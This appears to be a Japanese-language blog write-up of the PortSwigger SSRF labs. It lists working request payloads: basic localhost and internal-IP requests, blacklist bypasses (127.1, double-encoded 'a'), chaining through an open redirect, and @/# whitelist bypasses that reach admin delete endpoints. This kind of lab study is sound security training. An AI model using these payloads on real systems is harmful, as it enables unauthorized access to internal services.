---
title: 'Server-side request forgery < SSRF >'
description: 'PortSwigger SSRFの記録'
pubDate: 2026-02-26T22:20:00+09:00
category: 'PortSwigger'
tags: ['Web', 'SSRF']
---

# Server-side request forgery - PortSwigger

## Lab
### Basic SSRF against the local server

```bash
stockApi=http%3a//localhost/admin
```

```html
<section>
  <p>User deleted successfully!</p>
  <h1>Users</h1>
  <div>
    <span>wiener - </span>
    <a href="/admin/delete?username=wiener">Delete</a>
  </div>
  <div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
  </div>
</section>
```

### Basic SSRF against another back-end system

Burp の intruder を使用して対象の IP を調べる

.205 だけ respons が 404  
それ以外は 500

```bash
stockApi=http%3a//192.168.0.1:8080
```

```bash
stockApi=http%3a//192.168.0.205:8080/admin/delete?username=carlos
```

### SSRF with blacklist-based input filter

- 2130706433
- 127.1
- %61 (%2561) = a

```bash
stockApi=http%3a//127.1/%2561dmin/delete?username=carlos
```

### SSRF with filter bypass via open redirection vulnerability

Location を動的に変更でき内部IPを指定できる

```bash
# Request
/product/nextProduct?currentProductId=1&path=http%3a//192.168.0.12:8080/admin

# Response
HTTP/2 302 Found
Location: http://192.168.0.12:8080/admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

`"Missing parameter 'path'"`  
path パラメータが必要

```bash
stockApi=/product/nextProduct?path=http%3a//192.168.0.12:8080/admin/delete?username=carlos
```

### SSRF with whitelist-based input filter

- `@` (ホストを分離・偽装するため)
- `#` (通信に使われない領域を作るため)

*Failure*
```bash
stockApi=http%3a//stock.weliketoshop.net%40localhost/admin
```

*Success*
```bash
stockApi=http%3a//localhost%2523%40stock.weliketoshop.net/admin
```